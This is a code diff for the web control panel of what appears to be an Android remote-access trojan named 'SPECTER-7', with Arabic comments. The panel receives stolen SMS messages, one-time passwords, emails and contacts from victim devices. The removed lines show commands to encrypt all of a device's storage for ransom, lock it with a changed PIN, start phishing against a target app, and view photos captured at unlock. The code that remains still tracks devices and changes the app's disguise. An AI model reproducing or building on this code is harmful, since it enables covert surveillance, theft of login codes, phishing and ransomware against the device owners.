@@ -1,7 +1,3 @@
-// ═══════════════════════════════════════════════════════
-//  SPECTER-7 — Panel Core
-// ═══════════════════════════════════════════════════════
-
 function getAuthToken() {
     return sessionStorage.getItem('auth_token') || '';
 }
@@ -45,13 +41,6 @@ let liveEmails = [];
 let panelOpenTime = Date.now();
 let liveFilterEnabled = true;
 
-// ═══════════════════════════════════════════════════════
-// 🔐 حماية الأقسام الحساسة
-// ═══════════════════════════════════════════════════════
-const PROTECTED_TABS = ['admin', 'advanced'];
-const TAB_PASSWORD = '922499';
-const UNLOCKED_TABS = {};
-
 function logout() {
     const token = getAuthToken();
     if (token) {
@@ -67,13 +56,7 @@ function logout() {
     window.location.href = 'login.html';
 }
 
-function playNotificationSound() {
-    try {
-        const audio = new Audio('v.wav');
-        audio.volume = 1.0;
-        audio.play();
-    } catch (e) {}
-}
+function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }
 
 function findContactName(number) {
     if (!allContacts || allContacts.length === 0 || !number) return null;
@@ -97,9 +80,6 @@ function showNotification(title, message, icon) {
     setTimeout(() => { if (div.parentElement) div.remove(); }, 8000);
 }
 
-// ═══════════════════════════════════════════════════════
-// SSE
-// ═══════════════════════════════════════════════════════
 function initSSE() {
     if (sse) { try { sse.close(); } catch(e){} sse = null; }
     if (!currentDevice) return;
@@ -169,9 +149,7 @@ function initSSE() {
             } catch (err) {}
         });
 
-        sse.addEventListener('new_sms', (e) => {
-            try { addLiveMsg(JSON.parse(e.data)); } catch (err) {}
-        });
+        sse.addEventListener('new_sms', (e) => { try { addLiveMsg(JSON.parse(e.data)); } catch (err) {} });
 
         sse.addEventListener('new_otp', (e) => {
             try {
@@ -220,27 +198,6 @@ function initSSE() {
                 let msg = `إلى: ${d.number || ''}`;
                 if (d.error && !d.success) msg += `\nالسبب: ${d.error}`;
                 showNotification(d.success ? '✅ SMS أُرسلت' : '❌ فشل إرسال SMS', msg, '📨');
-            } catch (err) {}
-        });
-
-        sse.addEventListener('lock_result', (e) => {
-            try {
-                const d = JSON.parse(e.data);
-                if (d.status === 'success') {
-                    showNotification('🔒 تم القفل', `الرمز الجديد: ${d.pin}`, '🔒');
-                } else if (d.status === 'locked_only') {
-                    showNotification('🔒 مقفل', 'تم القفل لكن الرمز لم يتغير (يحتاج Device Owner)', '⚠️');
-                }
-            } catch (err) {}
-        });
-
-        sse.addEventListener('crypto_result', (e) => {
-            try {
-                const d = JSON.parse(e.data);
-                const isEncrypt = d.type === 'encryption_result';
-                const label = isEncrypt ? '🔒 تشفير' : '🔓 فك تشفير';
-                const msg = `${d.files_count} ملف\nالمدة: ${d.duration_sec} ثانية`;
-                showNotification(label, msg, isEncrypt ? '🔐' : '🔓');
             } catch (err) {}
         });
 
@@ -555,124 +512,6 @@ function renderLiveEmails() {
     });
 }
 function deleteLiveEmail(idx) { if (!confirm('حذف هذا البريد من الفيد؟')) return; liveEmails.splice(idx, 1); document.getElementById('liveEmailsCount').textContent = liveEmails.length; renderLiveEmails(); }
-
-// ═══════════════════════════════════════════════════════
-// ⚡ المميزات المتقدمة
-// ═══════════════════════════════════════════════════════
-function advancedAction(cmd, extra) {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-    const body = { device: currentDevice, command: cmd, token: getAuthToken() };
-    if (extra) Object.assign(body, extra);
-
-    fetch('/api.php', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-    }).then(r => r.json()).then(d => {
-        if (d.success) showNotification('✅ تم', 'تم إرسال الأمر للجهاز', '⚡');
-        else alert('❌ فشل — تأكد أن السيرفر يعمل');
-    }).catch(() => alert('❌ خطأ في الاتصال'));
-}
-
-function autoClickText() {
-    const text = document.getElementById('clickText').value.trim();
-    if (!text) { alert('⚠️ اكتب نص الزر'); return; }
-    advancedAction('auto_click', { text });
-    document.getElementById('clickText').value = '';
-}
-
-function autoReplyAny() {
-    const msg = document.getElementById('autoReplyText').value.trim();
-    if (!msg) { alert('⚠️ اكتب الرد'); return; }
-    advancedAction('auto_reply_any', { message: msg });
-    document.getElementById('autoReplyText').value = '';
-}
-
-function typeText() {
-    const text = document.getElementById('typeTextInput').value.trim();
-    if (!text) { alert('⚠️ اكتب النص'); return; }
-    advancedAction('type_text', { text });
-    document.getElementById('typeTextInput').value = '';
-}
-
-function encryptFiles() {
-    const pw = document.getElementById('encryptionPassword').value;
-    if (!pw || pw.length < 4) { alert('⚠️ كلمة المرور قصيرة (4+ أحرف)'); return; }
-    if (!confirm('⚠️ سيتم تشفير كل التخزين!\n\n• قد يستغرق ساعات\n• لا يمكن الفك بدون كلمة المرور\n• الملفات تُفقد للأبد إذا نسيت كلمة المرور\n\nاستمر؟')) return;
-    advancedAction('encrypt_files', { password: pw });
-    showNotification('🔐 جاري التشفير', 'ستبدأ العملية خلال ثواني — قد تستغرق ساعات', '🔐');
-}
-
-function decryptFiles() {
-    const pw = document.getElementById('encryptionPassword').value;
-    if (!pw) { alert('⚠️ أدخل كلمة المرور'); return; }
-    if (!confirm('🔓 فك تشفير كل الملفات؟')) return;
-    advancedAction('decrypt_files', { password: pw });
-    showNotification('🔓 جاري الفك', 'سيبدأ خلال ثواني', '🔓');
-}
-
-function openApp() {
-    const pkg = document.getElementById('openAppPackage').value.trim();
-    if (!pkg) { alert('⚠️ اكتب اسم الباكج'); return; }
-    advancedAction('open_app', { package: pkg });
-    document.getElementById('openAppPackage').value = '';
-}
-
-// ═══════════════════════════════════════════════════════
-// 🛡️ Admin — دوال خاصة
-// ═══════════════════════════════════════════════════════
-function setLockTimeout() {
-    const t = parseInt(document.getElementById('lockTimeoutInput').value);
-    if (!t || t < 5 || t > 600) {
-        alert('⚠️ القيمة يجب أن تكون بين 5 و 600 ثانية');
-        return;
-    }
-    advancedAction('lock_screen_timeout', { timeout: t * 1000 });
-    showNotification('⏱️ تم', 'قفل تلقائي بعد ' + t + ' ثانية', '⏱️');
-    document.getElementById('lockTimeoutInput').value = '';
-}
-
-// ═══ Admin Actions — Phishing & Unlock Photos ═══
-function startPhishing() {
-    const target = document.getElementById('phishingTarget').value.trim();
-    if (!target) {
-        alert('⚠️ اكتب اسم الباكج المستهدف');
-        return;
-    }
-    if (!confirm('🎣 تفعيل Auto-Phishing؟\n\n⚠️ تحذير: هذا غير قانوني — استخدمه على جهازك فقط.\n\nالمستهدف: ' + target)) return;
-
-    advancedAction('enable_phishing', { target: target });
-    showNotification('🎣 جاري التفعيل', 'المستهدف: ' + target, '🎣');
-    document.getElementById('phishingTarget').value = '';
-}
-
-function loadUnlockPhotos() {
-    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
-
-    authFetch(`/api.php?action=get_unlock_photos&device=${encodeURIComponent(currentDevice)}`)
-        .then(r => r.json())
-        .then(photos => {
-            const div = document.getElementById('unlockPhotosList');
-            if (!div) return;
-            div.innerHTML = '';
-
-            if (!Array.isArray(photos) || photos.length === 0) {
-                div.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:30px;">لا توجد صور بعد</p>';
-                return;
-            }
-
-            photos.forEach(photo => {
-                const card = document.createElement('div');
-                card.style.cssText = 'background:#111;padding:8px;border-radius:8px;border:1px solid #00ffcc;';
-                card.innerHTML = `
-                    <img src="data:image/jpeg;base64,${photo.data}" style="width:100%;height:150px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
-                    <div style="color:#00ffcc;font-size:11px;margin-top:6px;font-weight:bold;">📅 ${formatDate(photo.date)}</div>
-                `;
-                div.appendChild(card);
-            });
-        })
-        .catch(() => {});
-}
 
 // ═══ التنكر ═══
 async function changeDisguise(appName) {
@@ -990,6 +829,7 @@ function selectDevice(deviceId) {
     }
 }
 
+// ✅ محدّث: updateLiveData مع كل البيانات الجديدة
 async function updateLiveData() {
     if (!currentDevice) return;
     try {
@@ -997,6 +837,7 @@ async function updateLiveData() {
         const data = await response.json();
         if (data.error) return;
 
+        // ═══ الحالة ═══
         const statusEl = document.getElementById('networkStatus');
         if (statusEl) {
             if (data.online) {
@@ -1008,9 +849,11 @@ async function updateLiveData() {
             }
         }
 
+        // ═══ نوع الشبكة ═══
         const netEl = document.getElementById('networkTypeStatus');
         if (netEl) netEl.textContent = data.network_type || '—';
 
+        // ═══ البطارية ═══
         const battEl = document.getElementById('batteryStatus');
         if (battEl) {
             if (data.battery !== null && data.battery !== undefined && data.battery >= 0) {
@@ -1020,6 +863,7 @@ async function updateLiveData() {
             }
         }
 
+        // ═══ الشحن ═══
         const chargingEl = document.getElementById('chargingStatus');
         if (chargingEl) {
             if (data.charging) {
@@ -1030,6 +874,7 @@ async function updateLiveData() {
             }
         }
 
+        // ═══ آخر اتصال ═══
         const lastSeenEl = document.getElementById('lastSeen');
         if (lastSeenEl) {
             const ago = data.seconds_ago || 0;
@@ -1042,6 +887,7 @@ async function updateLiveData() {
             lastSeenEl.textContent = agoText;
         }
 
+        // ═══ العدادات ═══
         if (data.call_count !== undefined) {
             const el = document.getElementById('callCount');
             if (el) el.textContent = `(${data.call_count})`;
@@ -1071,6 +917,7 @@ async function updateLiveData() {
             if (vBadge && vBadge.textContent === '0') vBadge.textContent = String(data.voice_count);
         }
 
+        // ═══ اسم الجهاز + SIM ═══
         if (data.sim_numbers && data.sim_numbers.length > 0) {
             const display = document.getElementById('deviceNameDisplay');
             if (display && !display.textContent.includes(data.sim_numbers[0])) {
@@ -1078,7 +925,9 @@ async function updateLiveData() {
                 display.textContent = `${baseName} — 📱 ${data.sim_numbers[0]}`;
             }
         }
-    } catch (e) {}
+    } catch (e) {
+        console.log('updateLiveData error:', e);
+    }
 }
 
 async function loadAllData() {
@@ -1568,21 +1417,7 @@ async function loadDeviceInfo() {
     } catch (e) {}
 }
 
-// ═══════════════════════════════════════════════════════
-// 🔐 switchTab — مع حماية بكلمة مرور
-// ═══════════════════════════════════════════════════════
 function switchTab(tabName) {
-    // ✅ حماية الأقسام الحساسة
-    if (PROTECTED_TABS.includes(tabName) && !UNLOCKED_TABS[tabName]) {
-        const entered = prompt('🔐 أدخل كلمة المرور للدخول إلى هذا القسم:');
-        if (entered === null) return;
-        if (entered !== TAB_PASSWORD) {
-            alert('❌ كلمة المرور غير صحيحة');
-            return;
-        }
-        UNLOCKED_TABS[tabName] = true;
-    }
-
     document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
     const tab = document.querySelector(`.tab[onclick="switchTab('${tabName}')"]`);
@@ -1615,9 +1450,6 @@ async function triggerVoiceScan() {
     } catch (e) { alert('❌ خطأ: ' + e.message); }
 }
 
-// ═══════════════════════════════════════════════════════
-// 🔐 Device Approval
-// ═══════════════════════════════════════════════════════
 async function loadAuthorizedDevices() {
     if (!isOwner()) return;
     try {
